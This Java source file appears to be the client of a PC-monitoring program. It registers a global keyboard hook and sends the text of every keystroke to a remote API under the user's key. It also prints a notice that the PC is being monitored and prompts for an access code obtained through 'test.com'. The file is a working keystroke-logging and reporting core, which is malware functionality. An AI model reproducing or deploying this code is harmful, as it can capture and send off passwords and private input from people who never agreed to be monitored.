import java.awt.event.KeyEvent;

public class ClientEntryPoint {

    private ClientPreferences ClientPreferences;
    private ApiClient ApiClient;
    private GlobalKeyListener GlobalKeyListener;
    private User User;

    public ClientEntryPoint(ClientPreferences cp, ApiClient ac, GlobalKeyListener gkc) {
        this.ClientPreferences = cp;
        this.ApiClient = ac;
        this.GlobalKeyListener = gkc;
        this.Authoirze();
        gkc.Subscribe((k) -> {
            this.ApiClient.Report(KeyEvent.getKeyText(k.getRawCode()),  this.ClientPreferences.getKey());
            return true;
        });
    }

    public void Authoirze() {
        var key = this.ClientPreferences.getKey();
        this.User = this.ApiClient.Authorize(key);
    }

    public void Run() {
        this.Greetings();
    }

    private void Greetings() {
        System.out.println("Hi, " + this.User.Name + ".");
        var url = "test.com";
        System.out.print(Color.RED);
        if (!this.User.Authorized) {
            var scander = new java.util.Scanner(System.in);
            while (!this.User.Authorized) {
                System.out.println("You're not authorized - please refresh your code by visiting " + url + ", log in with your google account to receive code.");
                System.out.print(Color.RESET);
                System.out.print("Your new code: ");
                var line = scander.nextLine();
                this.ClientPreferences.setKey(line);
                this.Authoirze();
            }
        } else {
            System.out.println("You're authorized, this software is monitoring this pc.");
        }
    }
}
